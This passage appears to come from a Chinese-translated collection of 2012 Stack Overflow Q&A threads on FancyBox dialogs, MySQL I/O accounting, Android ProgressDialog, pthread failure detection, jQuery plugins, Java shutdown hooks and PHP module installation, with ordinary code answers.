> 感谢[Francisco Diaz](https://plus.google.com/u/0/106173875880670425914?prsrc=4)在[Google Groups FancyBox 论坛](https://groups.google.com/forum/#!forum/fancybox)上的[帖子](https://groups.google.com/d/topic/fancybox/0EJuF9C003w/discussion)为我指明了正确的方向。

**更新：**

现在已经扩展了我的示例以使用动态构建的按钮和自定义返回值，因此您不仅限于 true 和 false。

```
$(document).ready(function() {
    $(".fancybox").on("click", function(e){   
        e.preventDefault();
        confirm("Do you wish to continue?", {
                /* 
                Define your buttons here, can handle multiple buttons 
                with custom title and values
                */
                buttons: [
                    { class: "yes", type: "button", title: "Yes", value: "yes" },
                    { class: "no", type: "button", title: "No", value: "no" },
                    { class: "maybe", type: "button", title: "Maybe?", value: "maybe" }
                ],
                modal: true
            }, 
            function(resp) {
                alert("You clicked " + resp);
            }
        );
    });
});

function confirm(msg, options, callback) {
    $.fancybox("#confirm",{
        modal: options.modal,
        beforeShow: function() {
            this.content.prepend("<p class=\"title\"></p>");
            $(".title").html(msg);

            for (i = 0; i < options.buttons.length; i++) {
                this.content.append($("<input>", { 
                    type: "button", class: "confirm " + options.buttons[i].class, 
                    value: options.buttons[i].title
                  }).data("index", i));
            }
        },
        afterShow: function() {
            $(".confirm").on("click", function(event){
                ret = options.buttons[$(event.target).data("index")].value;
                $.fancybox.close();
            });
        },
        afterClose: function() {
            this.content.html("");
            callback.call(this, ret);
        }
    });
} 
```

添加`[jsfiddle](http://jsfiddle.net/lankymart/zLBNH/9/)`示例

# mysql - 写操作从何而来？

> ID：10446124
> 
> 赞同：1
> 
> 时间：2012-05-04T09:22:39.097
> 
> 标签：mysql, database, linux, io, procfs

我在数据库上做了一些实验。在这种情况下，每个查询都会从 TPCH 基准 ( `select * from table;`) 的一个表中选择所有内容。在我解析每个查询之前和之后`/proc/[pid]/io`，其中 [pid] 是数据库的进程。这些值的差异应该告诉我查询的 IO。这是 MySQL 的典型输出（秒，MB）：

```
 Query         time          RCHAR        WCHAR   READ_BYTES  WRITE_BYTES CANCELLED_WB
query1.sql|       0.005|       0.00234|     0.00245|     0.00391|     0.00000|     0.00000
query2.sql|       0.008|       0.00043|     0.00058|     0.00391|     0.00000|     0.00000
query3.sql|       0.041|       1.37217|     1.37296|     1.37891|     0.00000|     0.00000
query4.sql|       0.270|      23.41719|    23.64796|    23.44531|     0.00000|     0.00000
query5.sql|       0.346|      23.43413|    23.58974|    23.46484|     0.00000|     0.00000
query6.sql|       1.413|     113.77629|   115.76173|   113.89453|     0.00000|     0.00000
query7.sql|       1.792|     140.49537|   168.27847|   140.64062|     0.00000|     0.00000
query8.sql|       8.847|     614.04820|   759.00238|   614.65625|     0.00000|     0.00000
   Overall|      12.738|     916.54611|  1091.65626|   917.48828|     0.00000|     0.00000 
```

我想知道`WCHAR`（写字符）值来自哪里。我的查询“读取所有内容”而不是“写入任何内容”（由于“WRITE_BYTES”为空，实际上没有磁盘写入，而是写入缓存/缓冲区？）。我在这里想念什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:26:46.223

我认为 TTY io（也许还有网络？）包含在 WCHAR 中，但 WRITE_BYTES 只计算写入磁盘的页面。

# android - 如何在 Android 中显示进度对话框？

> ID：10446125
> 
> 赞同：62
> 
> 时间：2012-05-04T09:22:42.007
> 
> 标签：android, progressdialog

我想`ProgressDialog`在单击登录按钮时显示，移动到另一个页面需要时间。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：106
> 
> 时间：2012-05-04T09:25:40.873

```
ProgressDialog pd = new ProgressDialog(yourActivity.this);
pd.setMessage("loading");
pd.show(); 
```

这就是你所需要的。

* * *

## 回答 #2

> 赞同：67
> 
> 时间：2012-05-04T09:31:01.303

您最好尝试使用[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)

示例代码 -

```
private class YourAsyncTask extends AsyncTask<Void, Void, Void> {
    private ProgressDialog dialog;

    public YourAsyncTask(MyMainActivity activity) {
        dialog = new ProgressDialog(activity);
    }

    @Override
    protected void onPreExecute() {
        dialog.setMessage("Doing something, please wait.");
        dialog.show();
    }
    @Override
    protected Void doInBackground(Void... args) {
        // do background work here
        return null;
    }
    @Override
    protected void onPostExecute(Void result) {
         // do UI work here
        if (dialog.isShowing()) {
            dialog.dismiss();
        }
    }
} 
```

在您的登录按钮活动中使用上述代码。而且，做的东西`doInBackground`和`onPostExecute`

**更新：**

`ProgressDialog`正如`AsyncTask`你所说，你的任务需要时间来处理。

**更新：**

`ProgressDialog`自 API 26 起，该类已被弃用

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2016-06-24T10:46:36.577

要使用`ProgressDialog`以下代码

```
ProgressDialog progressdialog = new ProgressDialog(getApplicationContext());
progressdialog.setMessage("Please Wait...."); 
```

开始`ProgressDialog`使用

```
progressdialog.show(); 
```

`progressdialog.setCancelable(false);`使用，以便`ProgressDialog`在工作完成之前无法取消。

要停止`ProgressDialog`使用此代码（当您的工作完成时）：

```
progressdialog.dismiss();` 
```

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2012-05-04T09:35:47.040

[关于进度对话框](http://developer.android.com/guide/topics/ui/dialogs.html)，您应该记住的第一点是您应该在单独的线程中运行它。如果您在 UI 线程中运行它，您将看不到任何对话框。

如果您是[Android 线程](http://developer.android.com/guide/topics/fundamentals/processes-and-threads.html)新手，那么您应该了解[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)。这可以帮助您实现[无痛的 Threads](http://android-developers.blogspot.com/2009/05/painless-threading.html)。

示例代码

```
private class CheckTypesTask extends AsyncTask<Void, Void, Void>{
        ProgressDialog asyncDialog = new ProgressDialog(IncidentFormActivity.this);
        String typeStatus;

        @Override
        protected void onPreExecute() {
            //set message of the dialog
            asyncDialog.setMessage(getString(R.string.loadingtype));
            //show dialog
            asyncDialog.show();
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... arg0) {

            //don't touch dialog here it'll break the application
            //do some lengthy stuff like calling login webservice

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            //hide the dialog
            asyncDialog.dismiss();

            super.onPostExecute(result);
        }

} 
```

祝你好运。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2018-10-03T09:44:16.810

如下所示的简单编码`activity`：

```
private ProgressDialog dialog = new ProgressDialog(YourActivity.this);    
dialog.setMessage("please wait...");
dialog.show();
dialog.dismiss(); 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-07-22T05:36:23.360

声明你的进度对话框：

```
ProgressDialog progressDialog; 
```

要启动进度对话框：

```
progressDialog = ProgressDialog.show(this, "","Please Wait...", true); 
```

要关闭进度对话框：

```
 progressDialog.dismiss(); 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2017-09-17T08:20:41.530

ProgressDialog 现在已在 Android O 中正式弃用。我使用[https://github.com/Q115/DelayedProgressDialog](https://github.com/Q115/DelayedProgressDialog)中的 DelayedProgressDialog 来完成工作。

用法：

```
DelayedProgressDialog progressDialog = new DelayedProgressDialog();
progressDialog.show(getSupportFragmentManager(), "tag"); 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-04-05T09:44:14.140

这是使用对话框的好方法

```
private class YourAsyncTask extends AsyncTask<Void, Void, Void> {

   ProgressDialog dialog = new ProgressDialog(IncidentFormActivity.this);

   @Override
    protected void onPreExecute() {
        //set message of the dialog
        dialog.setMessage("Loading...");
        //show dialog
        dialog.show();
        super.onPreExecute();
    }

   protected Void doInBackground(Void... args) {
    // do background work here
    return null;
   }

   protected void onPostExecute(Void result) {
     // do UI work here
     if(dialog != null && dialog.isShowing()){
       dialog.dismiss()
     }

  }
} 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2016-06-24T10:57:48.190

当你调用 oncreate()

```
new LoginAsyncTask ().execute(); 
```

这里如何在流中使用..

```
ProgressDialog progressDialog;

  private class LoginAsyncTask extends AsyncTask<Void, Void, Void> {
  @Override
    protected void onPreExecute() {
        progressDialog= new ProgressDialog(MainActivity.this);
        progressDialog.setMessage("Please wait...");
        progressDialog.show();
        super.onPreExecute();
    }

     protected Void doInBackground(Void... args) {
        // Parsse response data
        return null;
     }

     protected void onPostExecute(Void result) {
        if (progressDialog.isShowing())
                        progressDialog.dismiss();
        //move activity
        super.onPostExecute(result);
     }
 } 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-05-04T09:31:30.150

```
ProgressDialog dialog = 
   ProgressDialog.show(yourActivity.this, "", "Please Wait..."); 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-04-18T07:46:43.307

```
ProgressDialog pd = new ProgressDialog(yourActivity.this);
pd.show(); 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-04-18T11:17:30.860

**步骤 1：创建 XML 文件**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">

    <Button
        android:id="@+id/btnProgress"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:text="Progress Dialog"/>
</LinearLayout> 
```

**第二步：创建一个 SampleActivity.java**

```
package com.scancode.acutesoft.telephonymanagerapp;

import android.app.Activity;
import android.app.ProgressDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class SampleActivity extends Activity implements View.OnClickListener {
    Button btnProgress;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnProgress = (Button) findViewById(R.id.btnProgress);
        btnProgress.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {

        final ProgressDialog progressDialog = new ProgressDialog(SampleActivity.this);
        progressDialog.setMessage("Please wait data is Processing");
        progressDialog.show();

//        After 2 Seconds i dismiss progress Dialog

        new Thread(){
            @Override
            public void run() {
                super.run();
                try {
                    Thread.sleep(2000);
                    if (progressDialog.isShowing())
                        progressDialog.dismiss();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }
} 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2017-03-11T08:20:19.207

```
 final ProgressDialog loadingDialog = ProgressDialog.show(context,
     "Fetching BloodBank List","Please wait...",false,false);  // for  showing the 
    // dialog  where context is the current context, next field is title followed by
    // message to be shown to the user and in the end intermediate field
    loadingDialog.dismiss();// for dismissing the dialog 
```

更多信息 [Android - progressDialog.show() 和 ProgressDialog.show() 有什么区别？](https://stackoverflow.com/questions/40748617/android-what-is-difference-between-progressdialog-show-and-progressdialog-sh)

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2018-01-11T08:07:55.113

自 API 26 起已弃用 ProgressDialog

你仍然可以使用这个：

```
public void button_click(View view)
{
    final ProgressDialog progressDialog = ProgressDialog.show(Login.this,"Please Wait","Processing...",true);
} 
```

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2018-05-08T05:26:14.397

简单的方法：

```
ProgressDialog pDialog = new ProgressDialog(MainActivity.this); //Your Activity.this
pDialog.setMessage("Loading...!");
pDialog.setCancelable(false);
pDialog.show(); 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2012-05-04T09:42:04.273

```
 final ProgressDialog progDailog = ProgressDialog.show(Inishlog.this, contentTitle, "even geduld aub....", true);//please wait....

        final Handler handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                Barcode_edit.setText("");
                showAlert("Product detail saved.");

            }

        };

        new Thread() {
            public void run() {
                try {
         } catch (Exception e) {

                }
                handler.sendEmptyMessage(0);
                progDailog.dismiss();
            }
        }.start(); 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2021-07-28T09:25:03.023

每当你想要**ProgressDialog**调用这个方法

```
 private void startLoader() {
    progress = new ProgressDialog(this);    //ProgressDialog
    progress.setTitle("Loading");
    progress.setMessage("Please wait");
    progress.setProgressStyle(ProgressDialog.STYLE_SPINNER);
    progress.setCancelable(false);
    progress.show();
    new Thread(new Runnable() {
        public void run() {
            try {
                Thread.sleep(7000);
            } catch (Exception e) {
                e.printStackTrace();
            }
            progress.dismiss();
        }
    }).start();
} 
```

# actionscript-3 - 如何在 Action Script 3 中使用其他语言的库？

> ID：10446126
> 
> 赞同：1
> 
> 时间：2012-05-04T09:22:42.980
> 
> 标签：actionscript-3, flash, air

有没有办法在 Action Script 3 中使用其他语言的库？对于 C/C++

我了解到我们可以使用 Alchemy： http: [//labs.adobe.com/technologies/alchemy/](http://labs.adobe.com/technologies/alchemy/)

但是对于其他语言（这里我指的是 Ruby 或 Java），我可以通过 AS3 使用它们的库吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T11:50:12.243

Alchemy 是一个从 LLVM 到 ABC 的交叉编译器，如果你感兴趣的语言可以编译到 LLVM，那么理论上你可以编译到 ABC。因此，Alchemy 也支持（经过一些调整）C# 或 Java（但您必须花一些时间让它们一起工作，没有现成的解决方案）。

AIR（它是 Flash 的桌面变体）可以使用称为“NativeProcess”的东西，这意味着授予操作系统可以执行库中的代码，然后您可以通过创建一个从库中调用函数的新进程来执行此操作。需要。

同样，在 AIR 中，有一个称为 ANE（AIR Native Extensions）的新功能 - 这允许您将 AIR 更紧密地绑定到本机代码。但是，它不需要像只在目标文件中那样是本机的，它应该是底层系统可以执行的东西。但我必须承认，我从未尝试过创建任何这样的扩展，所以我对它的了解是理论上的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T11:14:42.033

不，您不能在 Flash 中使用 Ruby 或 Java 代码/库。Alchemy 仅允许您使用 C 和 C++ 库。唯一的方法是将这些库移植到 ActionScript，或者您要使用的库可能已经移植到 AS3。

在 AS3 中也可能有类似的东西。如果有人知道您需要的库是否在 Flash 中具有等价物，您可以在此处或在 Flash 论坛上提出另一个问题。

# c# - 我们可以从具有 ClassLibrary 项目的 DLL 文件中返回一个 DataTable 吗？

> ID：10446127
> 
> 赞同：0
> 
> 时间：2012-05-04T09:22:45.467
> 
> 标签：c#, asp.net, dll, class-library

我想从 ClassLibrary Project 创建的 DLL 文件中返回一个 DataTable。那么是否可以从包含返回 DataTable 的代码的 DLL 文件中返回一个 DataTable？我也想在 asp.net 网站上使用它。请给任何建议...！例如：

```
public DataTable getData()
    {
       DataTable dt=new DataTable("Test");
       SqlCommand cmd=new SqlCommand();
       SqlDataAdapter da=new SqlDataAdapter();
       using(SqlConnection con=new SqlConnection(ConfigurationManager.ConnectionStrings["EMP"].ConnectionString))
        {
            da.SelectCommand = con.CreateCommand();
            da.SelectCommand.CommandType = CommandType.Text;
            da.SelectCommand.CommandText = "Select *from EMP";
            da.SelectCommand.Connection = con;
            try
            {
                con.Open();
                da.Fill(dt);
                con.Close();
            }
            catch (Exception ec)
            {

            }
            finally
            {

                con.Close();
            }

        }
        return dt;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:28:08.557

是的，可以返回 Datatable。你在做什么是正确的。确保您提供的连接字符串值为

```
ConfigurationManager.ConnectionStrings["EMP"].ConnectionString 
```

一些如何在 dll 中。

您可以提供 getData 的参数

```
public DataTable getData(string constr)
{
   //// Your code

   using(SqlConnection con=new SqlConnection(constr))
   { 
   ///// Your code
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:28:14.393

你当然可以。您必须在 ClassLibrary 项目中创建一个类，然后从 ASP.NET 项目中引用该项目或 DLL，创建该类的一个实例并调用该方法。

您在 ClassLibrary 项目中的类可能是这样的：

```
namespace Data
{
    public class MyDataProvider {
        public DataTable GetData()
        {
            // Your method code here
        }
    }
} 
```

您应该使用 ASP.NET 项目中的代码，如下所示：

```
// Create provider
Data.MyDataProvider provider = new Data.MyDataProvider();

// Get data
DataTable table = provider.GetData();

// Do stuff with your data... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:25:33.583

是的，一点没错。您可以从 dll 返回数据集 /datatable。事实上，这就是其他开发人员将数据层与业务层分离的做法。

我建议你阅读一些三层架构/ mvc 等的东西

# javascript - 如何在加载非常大的图像时显示加载屏幕？

> ID：10446128
> 
> 赞同：4
> 
> 时间：2012-05-04T09:22:46.017
> 
> 标签：javascript, html, css

我有一个 5MB 的图像，加载大约需要 2-3 分钟。当它加载时，我想要一个加载屏幕。加载图像后，该加载屏幕将消失。（图像是一个精灵图像；我使用 CSS 来分割它）。

如果这是可能的，那我该怎么做？如果这是不可能的，那么我可以使用哪些其他方法来隐藏图像的加载（或降低图像大小）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T09:27:04.457

> 该图像是精灵图像。
> 
> 我使用 css 来拆分它们。

除非有没有说明的附加信息，否则在 5MB 时您已经击败了 CSS sprite 的任何优势。将其拆分为单独的文件并按需延迟加载。

如果您正在使用/可以使用 jQuery ，那么[这个插件](http://www.appelsiini.net/projects/lazyload)可以很好地完成延迟加载。

还要确保您使用的是尽可能最好的[压缩](http://en.wikipedia.org/wiki/Image_compression)。即使您必须使用无损压缩，仍然可以通过从图像文件中删除元数据来获得一些收益。

Photoshop 中的“保存为 Web”非常适合平衡有损压缩（质量与大小），还可以让您选择不在图像文件中嵌入元数据。如果您无法访问 Photoshop，则可以使用 Yahoo [SmushIt 之类的工具。](http://smush.it)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:03:52.140

只需将页面/元素隐藏在某个加载层后面，并在加载图像后删除该层：

```
<!-- within you site header -->
<script type="text/javascript">
/* display loader only if JavaScript is enabled, no JS-lib loaded at this point */
document.write('<div id="loader" style="display:table; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; background: #fff;">'
    + '<div style="display:table-cell; vertical-align:middle; text-align: center;">'
    + 'loading…&lt;br /><img src="icon.load.gif" />'
    + '</div></div>');
</script>

<!-- at the bottom of you HTML (right before closing BODY-tag) -->
<script src="jquery.min.js"></script>
<script type="text/javascript">
/* hide the loading-message */
$(window).load(function(){
    $('#loader').fadeOut(500);
});
</script> 
```

诀窍是`$(window).load()`用作事件处理程序，直到所有页面内容完全加载后才会触发。

# android - 查看寻呼机不会膨胀好页面

> ID：10446130
> 
> 赞同：1
> 
> 时间：2012-05-04T09:22:59.667
> 
> 标签：android, android-viewpager

我正在尝试使用视图寻呼机制作画廊。尽管如此，位置 1 的视图总是被更新，而我正在尝试更新当前页面（默认为 0）。

首先，我创建了一个视图，该视图将被寻呼机充气。该视图由 4 个 ImageView 和 4 个 textview 组成。

然后我为寻呼机创建了一个适配器：

```
public class LivePagerAdapter extends PagerAdapter {

    private CameraList cameras = null;

    public LivePagerAdapter(CameraList cams)
    {
        this.cameras = cams;
    }

    @Override
    public int getCount() {
        return this.cameras.size() /4; // 4 imageview in a page
    }

    public void setCameras(CameraList cams)
    {
        this.cameras = cams;
    }

    @Override
    public Object instantiateItem(View container, int position) {
        LayoutInflater inflater = LayoutInflater.from(container.getContext());

        View view = inflater.inflate(R.layout.pager,null);
        ((ViewPager) container).addView(view,0);
        return view;
    }
} 
```

最后在我的活动中，我像这样实例化寻呼机：

```
adapter = new LivePagerAdapter(this.listeCamera);
pager = (ViewPager) findViewById(R.id.camspager);
pager.setAdapter(adapter);
pager.setCurrentItem(0); 
```

之后我用我的 4 imageview 初始化一个数组：

```
tabImageView.add((ImageView) findViewById(R.id.cam1)); //Imageview located in the view loaded by the pager
tabImageView.add((ImageView) findViewById(R.id.cam2));
tabImageView.add((ImageView) findViewById(R.id.cam3));
tabImageView.add((ImageView) findViewById(R.id.cam4)); 
```

并且在需要时我在图像视图中添加图像。

它似乎有效，除了我要求寻呼机从位置 0 开始，这是位置 1 的视图，它用我的图像更新。

当我使用时`findViewById(somethingInflatedByThePager)`，我需要它成为当前页面，我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:52:21.967

如果你替换`((ViewPager) container).addView(view,0);`为`((ViewPager) container).addView(view);`

# c - 如何在线程因某些错误而终止时收到通知

> ID：10446134
> 
> 赞同：6
> 
> 时间：2012-05-04T09:23:19.340
> 
> 标签：c, multithreading, posix, signals

我正在使用 posix 线程在 C 中使用固定数量的线程处理程序。

当线程由于某些错误而终止时，如何通知我？

有信号可以检测吗？

如果是这样，信号处理程序是否可以创建一个新线程以保持线程数相同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:28:11.307

1.  使线程分离
2.  让他们优雅地处理错误。即关闭互斥锁、文件等...

那么你就没有问题了。

也许向主线程发射一个 USR1 信号，告诉它事情已经变成梨形了（我想说山雀向上！）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:53:54.657

使用您提供的最新输入，我建议您执行以下操作来获取特定进程已启动的线程数-

```
#include<stdio.h>
#define THRESHOLD 50

int main ()
{
    unsigned count = 0;
    FILE *a;

    a = popen ("ps H `ps -A | grep a.out | awk '{print $1}'` | wc -l", "r");
    if (a == NULL)
        printf ("Error in executing command\n");

    fscanf(a, "%d", &count );

    if (count < THRESHOLD)
    {
        printf("Number of threads = %d\n", count-1);
            // count - 1 in order to eliminate header.
            // count - 2 if you don't want to include the main thread

        /* Take action. May be start a new thread etc */
    }

    return 0;
} 
```

**备注**：

*   `ps H`显示所有线程。

*   `$1`打印在我的系统 Ubuntu 上显示 PID 的第一列。列号可能会因系统而异

*   将`a.out`其替换为您的进程名称

*   反引号将评估其中的表达式并为您提供进程的 PID。我们正在利用所有 POSIX 线程将具有相同 PID 的事实。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:41:17.580

通过将函数指针传递给中间函数来创建线程。异步启动该中间函数并让它同步调用传递的函数。当函数返回或抛出异常时，您可以以任何您喜欢的方式处理结果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T11:40:19.343

我怀疑当线程因任何原因死亡或退出时，Linux 会向您发出信号。您可以手动执行此操作。

首先，让我们考虑两种线程结束的方式：

*   它自行终止
*   它死了

在第一种方法中，线程本身可以告诉某人（比如线程管理器）它正在被终止。然后线程管理器将产生另一个线程。

在第二种方法中，看门狗线程可以跟踪线程是否处于活动状态。这或多或少是这样完成的：

```
Thread:
    while (do stuff)
        this_thread->is_alive = true
        work

Watchdog:
    for all threads t
        t->timeout = 0
    while (true)
        for all threads t
            if t->is_alive
                t->timeout = 0
                t->is_alive = false
            else
                ++t->timeout
                if t->timeout > THRESHOLD
                    Thread has died! Tell the thread manager to respawn it 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-04T15:10:11.987

如果由于任何原因无法采用 Ed Heal 的“正常工作”方法（这是我对 OP 问题的最喜欢的答案，顺便说一句），那么懒惰的狐狸可能会看看`pthread_cleanup_push()`and`pthread_cleanup_pop()`宏，并考虑包括整个线程函数的主体在这两个宏之间。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-05-10T00:20:03.133

知道线程是否完成的干净方法是调用`pthread_join()`该线程。

```
// int pthread_join(pthread_t thread, void **retval);
int retval = 0;
int r = pthread_join(that_thread_id, &retval);
... here you know that_thread_id returned ... 
```

问题`pthread_join()`是，如果线程永远不会返回（继续按预期运行），那么您将被阻止。因此，这在您的情况下不是很有用。

但是，您实际上可以检查是否可以加入（tryjoin），如下所示：

```
//int pthread_tryjoin_np(pthread_t thread, void **retval);
int retval = 0;
int r = pthread_tryjoin_np(that_thread_id, &relval);

// here 'r' tells you whether the thread returned (joined) or not.
if(r == 0)
{
   // that_thread_id is done, create new thread here
   ...
}
else if(errno != EBUSY)
{
   // react to "weird" errors... (maybe a perror() at least?)
}
// else -- thread is still running 
```

还有一个定时加入，它将等待您指定的时间，例如几秒钟。根据要检查的线程数以及您的主进程是否处于其他位置，这可能是一个解决方案。在线程 1 上阻塞 5 秒，然后在线程 2 上阻塞 5 秒，等等。对于 1,000 个线程，每个循环需要 5,000 秒（大约需要 85 分钟来处理所有线程以及管理事物所需的时间......）

手册页中有一个示例代码，它显示了如何使用 pthread_timedjoin_np() 函数。您所要做的就是放置一个 for 循环来检查每个线程。

```
struct timespec ts;
int s;

...

if (clock_gettime(CLOCK_REALTIME, &ts) == -1) {
 /* Handle error */
}

ts.tv_sec += 5;

s = pthread_timedjoin_np(thread, NULL, &ts);
if (s != 0) {
   /* Handle error */
} 
```

如果你的主进程有其他事情要做，我建议你不要使用定时版本，尽可能快地遍历所有线程。

# javascript - 在创建 jquery 插件时需要帮助

> ID：10446135
> 
> 赞同：2
> 
> 时间：2012-05-04T09:23:20.897
> 
> 标签：javascript, jquery, jquery-plugins

我正在创建一个名为 togglebutton 的简单 jquery 插件。我的问题在底部。这是代码。

```
/** CSS */
.toggle-button{
    -moz-border-radius:4px;
    border-radius:4px;
    border:solid gray 1px;
    padding:4px;
    color:#fff; 
}
.state-on{ background:gray; }

.state-off{ background:blue; }

/** JQuery Plugin Definition */
jQuery.fn.togglebutton = function (options) {
    myoptions = jQuery.extend ({
    state: "off",
    }, options);

    this.click(function(){
        myoptions.click;
        opt = options;
        $this = $(this);
        if(opt.state == 'on'){
            turnoff($this);
            opt.state = 'off';
        }
        else if(opt.state == 'off'){
            turnon($this);
            opt.state = 'on';
        }
    });

    this.each(function () {
        this.options = myoptions;
        $this = $(this);
        opt = this.options;

        if(opt.state == 'on'){
            $this.attr('class', "toggle-button state-on");
        }
        else if(opt.state == 'off'){
            $this.attr('class', "toggle-button state-off");
        }

    });

    function turnon($this){
        $this.attr('class', "toggle-button state-on");
    }
    function turnoff($this){
        $this.attr('class', "toggle-button state-off");
    }
}

/** How to Call */
$('#crop').togglebutton({state:'off'}); 
```

我将在我的 jquery 插件定义中添加什么，以便我可以将其称为：

```
$('#crop').togglebutton({
    state:'off',
    click: function(event, ui) {
        val = ui.value;
    }
}); 
```

任何帮助深表感谢。我是这种东西的新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:25:44.937

示例启动方式：

```
// plugin definition
$.fn.togglebutton = function() {
  // Your plugin implementation code goes here.
}; 
```

这是一个很棒的教程，很容易实现

[http://www.learningjquery.com/2007/10/a-plugin-development-pattern](http://www.learningjquery.com/2007/10/a-plugin-development-pattern)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:30:06.173

```
$.fn.hello = function(options) {

   return this.each(function() {

   });
}; 
```

那么你可以通过以下方式使用上述插件..

```
$('.tip').hello(); 
```

# java - Java中的addShutDownHook和信号处理程序有什么区别？

> ID：10446136
> 
> 赞同：0
> 
> 时间：2012-05-04T09:23:21.453
> 
> 标签：java, signals, shutdown

当我的程序使用 addShutDownHook 时，它表现得很奇怪？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:39:07.540

addShutDownHook 只是添加了一个新的 Runnable(thread)，只有在启动 jvm 关闭序列时才会由 jvm 运行。其中的代码像普通代码一样执行，但仅限于前面提到的特殊情况。它通常用于一些清理或记录目的

请重新检查编写的代码，以确保它“逻辑上”符合您的期望。

java中的信号处理（尤其是在Windows上，文档仍然不是100％清晰） [参考](https://stackoverflow.com/questions/1409165/signal-handling-using-term)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:49:48.593

发送信号时触发信号处理程序。信号不必关闭应用程序，如果应用程序关闭，则可能不会调用信号处理程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-08T14:59:37.443

您可以在 SignalHandler 的 handle 方法中实现逻辑，在该方法中，您可以在 unix、ilnux 和 windows 等不同平台（OS）下处理来自当前活动进程的不同信号。SignalHandler 中的逻辑可以像标准输出信号名称和时间戳一样，在接收到某些特殊信号类型时记录或关闭进程。

当我们使用 addShutDownHook 时，我们只是设置了线程退出的顺序，只有当 JVM 开始关闭时才会触发线程退出的顺序。

我们经常在线程中使用 addShutDownHook 这个方法来释放资源或者网络连接，而 SignalHandler && Signal 经常被用来监控在这个进程活跃时间内服务器进程从哪里接收到什么以及接收到什么。

# xslt - 真的对安装 PHP 模块感到困惑

> ID：10446137
> 
> 赞同：0
> 
> 时间：2012-05-04T09:23:25.727
> 
> 标签：xslt, whm

我需要将[http://us3.php.net/xsl](http://us3.php.net/xsl)这个模块添加到我的 PHP 中，但我真的很困惑我实际上是如何做到这一点的？它在从该链接安装时说'PHP 5 默认包含 XSL 扩展，可以通过将参数 --with-xsl[=DIR] 添加到您的配置行来启用。DIR 是 libxslt 安装目录。但不确定这些文件在哪里？我有一个 VPS 并且可以访问 WHM Cpanel，我可以从那里执行此操作吗？我遇到了该软件并在 WHM 中安装了模块位，但感觉这不是我想要的...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:34:42.720

转到 WHM -> 软件 -> EasyApache（Apache 更新）

在 EasyApache 页面上，选择*Start customizing based on profile now*，然后在几个屏幕之后，选择*Exhaustive Options List*。选择您要安装的模块，在您的情况下选择 XSL，然后继续重新编译。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:29:38.233

如果您需要当前没有的任何模块，则需要手动编译 PHP。有很多教程如何做到这一点，例如，如果您将 Apache 2 作为网络服务器，请在 php.net 上关注此页面：[http://www.php.net/manual/en/install.unix.apache2。 php](http://www.php.net/manual/en/install.unix.apache2.php)

编译 PHP 时，要执行的命令之一是

```
./configure 
```

您可以在其中（大多数虚拟主机都可以）提供许多参数，这些参数说明您想要安装哪些模块以及 PHP 可以使用哪些功能。它可能看起来像这样：

```
